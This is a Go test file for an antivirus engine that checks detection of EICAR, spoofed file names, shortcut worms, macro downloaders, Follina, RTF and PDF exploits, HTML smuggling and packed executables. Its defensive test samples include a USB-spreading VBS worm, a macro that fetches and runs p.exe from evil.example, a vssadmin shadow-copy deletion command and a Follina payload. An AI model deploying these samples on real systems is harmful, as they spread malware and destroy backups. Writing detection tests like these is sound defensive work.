package engine

import (
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/rand"
	"encoding/binary"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/twopiq/antivirus/internal/sigdb"
)

const eicar = `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`

func names(ts []Threat) string {
	var s []string
	for _, t := range ts {
		s = append(s, t.Name)
	}
	return strings.Join(s, ",")
}

func TestEICARHashAndRule(t *testing.T) {
	e := New(nil)
	ts := e.ScanBytes("eicar.com", []byte(eicar))
	if !strings.Contains(names(ts), "EICAR-Test-File") {
		t.Fatalf("EICAR topilmadi: %v", names(ts))
	}
	hashHit := false
	for _, th := range ts {
		if th.Kind == KindHash {
			hashHit = true
		}
	}
	if !hashHit {
		t.Fatal("EICAR xeshi ichki bazada topilmadi")
	}
	// Standart bo'yicha: satr bilan boshlanib, oxirida bo'shliq bo'lishi mumkin.
	if ts := e.ScanBytes("x.txt", []byte(eicar+"\r\n")); !strings.Contains(names(ts), "EICAR") {
		t.Fatal("EICAR qoidasi ishlamadi")
	}
	// Katta fayl ichida (masalan boshqa antivirus dasturi) — EICAR emas.
	if ts := e.ScanBytes("av.exe", []byte("MZ.... "+eicar+" ....")); len(ts) != 0 {
		t.Fatalf("ichida EICAR satri bor fayl noto'g'ri aniqlandi: %v", names(ts))
	}
}

func TestCleanFile(t *testing.T) {
	e := New(nil)
	if ts := e.ScanBytes("readme.txt", []byte("Salom dunyo")); len(ts) != 0 {
		t.Fatalf("toza faylda tahdid: %v", names(ts))
	}
	if ts := e.ScanBytes("setup.bat", []byte("@echo off\r\ncopy a.txt b.txt\r\n")); len(ts) != 0 {
		t.Fatalf("oddiy bat faylda tahdid: %v", names(ts))
	}
}

func TestNameHeuristics(t *testing.T) {
	cases := map[string]string{
		"hujjat.pdf.exe":            "Heur.DoubleExtension",
		"rasm.jpg      .scr":        "Heur.DoubleExtension",
		"photo\u202Egpj.exe":        "Heur.RTLO.SpoofedName",
		"Shartnoma.docx.vbs":        "Heur.DoubleExtension",
		"normal.exe":                "",
		"archive.tar.gz":            "",
		"version.1.2.exe":           "",
		"C:\\Users\\a\\file.mp4.js": "Heur.DoubleExtension",
	}
	for n, want := range cases {
		got := names(checkName(n))
		if want == "" && got != "" || want != "" && !strings.Contains(got, want) {
			t.Errorf("%q: kutilgan %q, olingan %q", n, want, got)
		}
	}
}

func fakePE() []byte {
	b := make([]byte, 0x100)
	b[0], b[1] = 'M', 'Z'
	b[0x3c] = 0x80
	copy(b[0x80:], "PE\x00\x00")
	return b
}

func TestDisguisedExecutable(t *testing.T) {
	e := New(nil)
	if ts := e.ScanBytes("rasm.jpg", fakePE()); !strings.Contains(names(ts), "Heur.DisguisedExecutable") {
		t.Fatalf("niqoblangan exe topilmadi: %v", names(ts))
	}
	if ts := e.ScanBytes("program.exe", fakePE()); len(ts) != 0 {
		t.Fatalf("oddiy exe: %v", names(ts))
	}
}

func utf16(s string) []byte {
	var b []byte
	for _, r := range s {
		b = append(b, byte(r), 0)
	}
	return b
}

func TestShortcutVirus(t *testing.T) {
	e := New(nil)
	lnk := append(append([]byte{}, lnkHeader...), make([]byte, 60)...)
	lnk = append(lnk, utf16(`..\..\..\Windows\System32\cmd.exe`)...)
	lnk = append(lnk, utf16(`/c start "" "WindowsServices.vbs" & start explorer "Hujjatlar" & exit`)...)
	if ts := e.ScanBytes("Hujjatlar.lnk", lnk); !strings.Contains(names(ts), "Worm.LNK.ShortcutVirus") {
		t.Fatalf("yorliq virusi topilmadi: %v", names(ts))
	}
	clean := append(append([]byte{}, lnkHeader...), make([]byte, 60)...)
	clean = append(clean, utf16(`C:\Program Files\Mozilla Firefox\firefox.exe`)...)
	if ts := e.ScanBytes("Firefox.lnk", clean); len(ts) != 0 {
		t.Fatalf("toza yorliqda tahdid: %v", names(ts))
	}
}

func TestScriptRules(t *testing.T) {
	e := New(nil)
	worm := `Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")
For Each d In fso.Drives
  If d.DriveType = 1 Then
    fso.CopyFile WScript.ScriptFullName, d.Path & "\x.vbs"
    Set lnk = sh.CreateShortcut(d.Path & "\Docs.lnk")
  End If
Next
sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svc", "wscript x.vbs"`
	if ts := e.ScanBytes("x.vbs", []byte(worm)); !strings.Contains(names(ts), "Worm.Script.USBSpreader") {
		t.Fatalf("USB qurti topilmadi: %v", names(ts))
	}
	ps := `powershell -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=`
	if ts := e.ScanBytes("run.bat", []byte(ps)); !strings.Contains(names(ts), "Trojan.PowerShell.HiddenEncoded") {
		t.Fatalf("PowerShell trojan topilmadi: %v", names(ts))
	}
	rs := "@echo off\r\nvssadmin delete shadows /all /quiet\r\n"
	if ts := e.ScanBytes("x.cmd", []byte(rs)); !strings.Contains(names(ts), "Ransom.Script.ShadowCopyDelete") {
		t.Fatalf("ransomware skripti topilmadi: %v", names(ts))
	}
	// Qoida skript bo'lmagan faylga qo'llanmasligi kerak.
	if ts := e.ScanBytes("notes.txt", []byte(worm)); len(ts) != 0 {
		t.Fatalf("txt faylda skript qoidasi ishladi: %v", names(ts))
	}
}

func TestZipAndScanPaths(t *testing.T) {
	dir := t.TempDir()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, _ := zw.Create("invoice.pdf.exe")
	w.Write(fakePE())
	w, _ = zw.Create("eicar.txt")
	w.Write([]byte(eicar))
	zw.Close()
	os.WriteFile(filepath.Join(dir, "a.zip"), buf.Bytes(), 0o644)
	os.WriteFile(filepath.Join(dir, "ok.txt"), []byte("ok"), 0o644)
	sub := filepath.Join(dir, "sub")
	os.Mkdir(sub, 0o755)
	os.WriteFile(filepath.Join(sub, "eicar.com"), []byte(eicar), 0o644)
	excl := filepath.Join(dir, "excluded")
	os.Mkdir(excl, 0o755)
	os.WriteFile(filepath.Join(excl, "eicar.com"), []byte(eicar), 0o644)

	e := New(nil)
	res := e.ScanPaths(context.Background(), []string{dir}, Options{Exclude: []string{excl}})
	if res.Files != 3 {
		t.Fatalf("fayllar soni: %d", res.Files)
	}
	var inner, plain int
	for _, th := range res.Threats {
		if strings.Contains(th.Path, "excluded") {
			t.Fatal("istisno qilingan papka tekshirildi")
		}
		if th.Inner != "" {
			inner++
		} else if strings.HasSuffix(th.Path, "eicar.com") {
			plain++
		}
	}
	if inner < 2 || plain == 0 {
		t.Fatalf("arxiv ichidagi=%d oddiy=%d: %+v", inner, plain, res.Threats)
	}
}

func TestVBADecompress(t *testing.T) {
	// "abc" literallari + nusxa tokeni (siljish 3, uzunlik 6) = "abcabcabc".
	c := []byte{0x01, 0x05, 0xB0, 0x08, 'a', 'b', 'c', 0x03, 0x20}
	out, ok := decompressVBA(c)
	if !ok || string(out) != "abcabcabc" {
		t.Fatalf("%q %v", out, ok)
	}
}

// compressLiteral MS-OVBA konteynerini faqat literallar bilan quradi (testlar uchun).
func compressLiteral(src []byte) []byte {
	out := []byte{0x01}
	for len(src) > 0 {
		n := min(len(src), 4096)
		chunk := src[:n]
		src = src[n:]
		var body []byte
		for i := 0; i < len(chunk); i += 8 {
			body = append(body, 0x00)
			body = append(body, chunk[i:min(i+8, len(chunk))]...)
		}
		size := len(body) + 2
		hdr := uint16(size-3) | 0x3000 | 0x8000
		out = append(out, byte(hdr), byte(hdr>>8))
		out = append(out, body...)
	}
	return out
}

const maliciousMacro = `Attribute VB_Name = "ThisDocument"
Sub AutoOpen()
  Set x = CreateObject("MSXML2.XMLHTTP")
  x.Open "GET", "http://evil.example/p.exe", False
  x.Send
  Set s = CreateObject("ADODB.Stream")
  s.SaveToFile Environ("TEMP") & "\p.exe"
  Shell Environ("TEMP") & "\p.exe"
End Sub`

func TestMacroDetection(t *testing.T) {
	e := New(nil)
	vba := append([]byte("junk header \x00\x00"), compressLiteral([]byte(maliciousMacro))...)
	// .docm: zip ichida word/vbaProject.bin
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, _ := zw.Create("[Content_Types].xml")
	w.Write([]byte("<Types/>"))
	w, _ = zw.Create("word/vbaProject.bin")
	w.Write(vba)
	zw.Close()
	ts := e.ScanBytes("hisob.docm", buf.Bytes())
	if !strings.Contains(names(ts), "Trojan.Macro.Downloader") {
		t.Fatalf("makros topilmadi: %v", names(ts))
	}
	// .doc (OLE2)
	ole := append(append([]byte{}, ole2Magic...), make([]byte, 504)...)
	ole = append(ole, vba...)
	if ts := e.ScanBytes("hisob.doc", ole); !strings.Contains(names(ts), "Trojan.Macro.Downloader") {
		t.Fatalf("OLE makros topilmadi: %v", names(ts))
	}
	benign := compressLiteral([]byte("Attribute VB_Name = \"Module1\"\nSub Hisobla()\n  Range(\"A1\").Value = 1\nEnd Sub"))
	ole2 := append(append(append([]byte{}, ole2Magic...), make([]byte, 504)...), benign...)
	if ts := e.ScanBytes("jadval.xls", ole2); len(ts) != 0 {
		t.Fatalf("zararsiz makrosda tahdid: %v", names(ts))
	}
}

func TestDocumentExploits(t *testing.T) {
	e := New(nil)
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, _ := zw.Create("word/_rels/document.xml.rels")
	w.Write([]byte(`<Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:https://x.example/!x-usc:ms-msdt:/id PCWDiagnostic" TargetMode="External"/>`))
	zw.Close()
	if ts := e.ScanBytes("doc.docx", buf.Bytes()); !strings.Contains(names(ts), "Exploit.Office.Follina") {
		t.Fatalf("Follina: %v", names(ts))
	}
	pdf := []byte("%PDF-1.4\n1 0 obj << /Type /Catalog /OpenAction 2 0 R >>\n2 0 obj << /S /JavaScript /JS (app.alert(1)) >>")
	if ts := e.ScanBytes("a.pdf", pdf); !strings.Contains(names(ts), "Heur.PDF.AutoJavaScript") {
		t.Fatalf("PDF: %v", names(ts))
	}
	rtf := []byte(`{\rtf1{\object\objemb{\*\objclass Equation.3}\objdata 0105000002000000}}`)
	if ts := e.ScanBytes("a.rtf", rtf); !strings.Contains(names(ts), "Exploit.RTF.EquationEditor") {
		t.Fatalf("RTF: %v", names(ts))
	}
	html := []byte(`<script>var b=new Blob([atob("TVqQ")]);var a=document.createElement("a");a.download="x.exe";a.href=URL.createObjectURL(b);a.click()</script>`)
	if ts := e.ScanBytes("invoice.html", html); !strings.Contains(names(ts), "Heur.HTML.Smuggling") {
		t.Fatalf("HTML: %v", names(ts))
	}
}

func TestNestedArchives(t *testing.T) {
	e := New(nil)
	var inner bytes.Buffer
	zw := zip.NewWriter(&inner)
	w, _ := zw.Create("deep/eicar.com")
	w.Write([]byte(eicar))
	zw.Close()
	var gz bytes.Buffer
	gw := gzip.NewWriter(&gz)
	gw.Name = "inner.zip"
	gw.Write(inner.Bytes())
	gw.Close()
	var outer bytes.Buffer
	zw = zip.NewWriter(&outer)
	w, _ = zw.Create("x.zip.gz")
	w.Write(gz.Bytes())
	zw.Close()
	ts := e.ScanBytes("outer.zip", outer.Bytes())
	found := false
	for _, th := range ts {
		if th.Name == "EICAR-Test-File" && th.Inner == "x.zip.gz > inner.zip > deep/eicar.com" {
			found = true
		}
	}
	if !found {
		t.Fatalf("ichma-ich arxiv: %+v", ts)
	}
	e.MaxArchiveDepth = 1
	for _, th := range e.ScanBytes("outer.zip", outer.Bytes()) {
		if th.Name == "EICAR-Test-File" {
			t.Fatal("chuqurlik cheklovi ishlamadi")
		}
	}
}

type testSection struct {
	name  string
	chars uint32
	data  []byte
}

// buildPE oddiy 32-bitli PE fayl quradi.
func buildPE(secs []testSection, epRVA uint32) []byte {
	const fileAlign, secAlign = 0x200, 0x1000
	b := make([]byte, 0x400)
	b[0], b[1] = 'M', 'Z'
	binary.LittleEndian.PutUint32(b[0x3c:], 0x80)
	copy(b[0x80:], "PE\x00\x00")
	coff := b[0x84:]
	binary.LittleEndian.PutUint16(coff[0:], 0x14c)
	binary.LittleEndian.PutUint16(coff[2:], uint16(len(secs)))
	binary.LittleEndian.PutUint32(coff[4:], 0x5f000000)
	binary.LittleEndian.PutUint16(coff[16:], 224)
	binary.LittleEndian.PutUint16(coff[18:], 0x0102)
	opt := b[0x98:]
	binary.LittleEndian.PutUint16(opt[0:], 0x10b)
	binary.LittleEndian.PutUint32(opt[16:], epRVA)
	binary.LittleEndian.PutUint32(opt[28:], 0x400000)
	binary.LittleEndian.PutUint32(opt[32:], secAlign)
	binary.LittleEndian.PutUint32(opt[36:], fileAlign)
	binary.LittleEndian.PutUint32(opt[92:], 16)
	sh := b[0x98+224:]
	raw := uint32(0x400)
	var body []byte
	for i, s := range secs {
		h := sh[i*40:]
		copy(h[0:8], s.name)
		size := (uint32(len(s.data)) + fileAlign - 1) / fileAlign * fileAlign
		binary.LittleEndian.PutUint32(h[8:], uint32(len(s.data)))
		binary.LittleEndian.PutUint32(h[12:], uint32(secAlign*(i+1)))
		binary.LittleEndian.PutUint32(h[16:], size)
		binary.LittleEndian.PutUint32(h[20:], raw)
		binary.LittleEndian.PutUint32(h[36:], s.chars)
		d := make([]byte, size)
		copy(d, s.data)
		body = append(body, d...)
		raw += size
	}
	return append(b, body...)
}

func TestPEHeuristics(t *testing.T) {
	random := make([]byte, 8192)
	rand.Read(random)
	packed := buildPE([]testSection{
		{"UPX0", 0xE0000080, nil},
		{"UPX1", 0xE0000040, random},
	}, 0x2000+100)
	pi := analyzePE(packed)
	if pi.score < peThreshold {
		t.Fatalf("paketlangan PE ball: %d %v", pi.score, pi.reasons)
	}
	if pi.ep != 0x400+100 {
		t.Fatalf("EP siljishi: %#x", pi.ep)
	}
	e := New(nil)
	if ts := e.ScanBytes("setup.exe", packed); !strings.Contains(names(ts), "Heur.PE.Suspicious") {
		t.Fatalf("evristika: %v", names(ts))
	}
	// Imzolangan fayl uchun shubhali natija olib tashlanadi.
	dir := t.TempDir()
	p := filepath.Join(dir, "setup.exe")
	os.WriteFile(p, packed, 0o644)
	e.Trusted = func(string) bool { return true }
	if ts, _ := e.ScanFile(p); len(ts) != 0 {
		t.Fatalf("ishonchli imzoli faylda: %v", names(ts))
	}

	normal := buildPE([]testSection{{".text", 0x60000020, bytes.Repeat([]byte{0x90, 0xC3}, 2000)}, {".data", 0xC0000040, make([]byte, 512)}}, 0x1000)
	if pi := analyzePE(normal); pi.score >= peThreshold {
		t.Fatalf("oddiy PE ball: %d %v", pi.score, pi.reasons)
	}
}

func TestEngineWithDB(t *testing.T) {
	root := t.TempDir()
	st := sigdb.Store{Root: root}
	os.MkdirAll(st.SourcesDir(), 0o755)
	malware := []byte("bu sinov uchun zararli namuna 12345")
	h := New(nil).hashes(malware)
	pe := buildPE([]testSection{{".text", 0x60000020, append([]byte("ENTRYCODE-SIGNATURE"), make([]byte, 600)...)}}, 0x1000)
	os.WriteFile(filepath.Join(st.SourcesDir(), "test.hdb"), []byte(binHex(h.MD5)+":35:Win.Trojan.Test-1-0\n"), 0o644)
	os.WriteFile(filepath.Join(st.SourcesDir(), "test.ndb"), []byte("Win.Trojan.EPSig-2-0:1:EP+0:454e545259434f4445\nWin.Trojan.Anywhere-3-0:0:*:4d414c4943494f5553\n"), 0o644)
	if _, err := st.Rebuild(nil); err != nil {
		t.Fatal(err)
	}
	db, err := st.Open()
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	e := New(db)
	if ts := e.ScanBytes("x.bin", malware); !strings.Contains(names(ts), "Win.Trojan.Test") {
		t.Fatalf("md5 imzosi: %v", names(ts))
	}
	if ts := e.ScanBytes("x.exe", pe); !strings.Contains(names(ts), "Win.Trojan.EPSig-2-0") {
		t.Fatalf("EP imzosi: %v", names(ts))
	}
	if ts := e.ScanBytes("x.txt", []byte("...MALICIOUS...")); !strings.Contains(names(ts), "Win.Trojan.Anywhere-3-0") {
		t.Fatalf("tana imzosi: %v", names(ts))
	}
	// Foydalanuvchi ishonchli ro'yxati.
	e.Allow[binHex(h.SHA256)] = true
	if ts := e.ScanBytes("x.bin", malware); len(ts) != 0 {
		t.Fatalf("ishonchli fayl: %v", names(ts))
	}
}

func binHex(b []byte) string {
	const d = "0123456789abcdef"
	out := make([]byte, 0, len(b)*2)
	for _, c := range b {
		out = append(out, d[c>>4], d[c&15])
	}
	return string(out)
}

func TestReversedRules(t *testing.T) {
	e := New(nil)
	if ts := e.ScanBytes("miner.exe", append(fakePE(), []byte("pool=stratum+tcp://pool.example:3333")...)); !strings.Contains(names(ts), "Riskware.CoinMiner") {
		t.Fatalf("maynir: %v", names(ts))
	}
	if ts := e.ScanBytes("r.exe", append(fakePE(), []byte("cmd /c vssadmin delete shadows /all /quiet")...)); !strings.Contains(names(ts), "Ransom.Generic.ShadowCopyDelete") {
		t.Fatalf("ransom: %v", names(ts))
	}
}
